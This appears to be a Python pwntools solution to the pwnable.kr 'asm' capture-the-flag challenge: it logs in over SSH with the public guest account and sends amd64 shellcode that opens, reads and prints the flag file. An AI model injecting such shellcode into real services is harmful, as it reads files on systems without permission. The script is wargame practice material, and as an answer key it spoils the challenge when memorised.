from pwn import *

PATH = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
LENGTH = 40
s = ssh(host='pwnable.kr',user='asm',password='guest',port=2222)
context(arch='amd64', os='linux')

def main():
    shellcode = asm(shellcraft.open(PATH) + shellcraft.read('rax', 'rsp', LENGTH) + shellcraft.write(1, 'rsp', LENGTH))
    p = s.remote("0", 9026)
    print(p.recv().decode())
    p.sendline(shellcode)
    print(p.recv().decode())
    p.close()
    s.close()

if __name__ == "__main__":
	main()
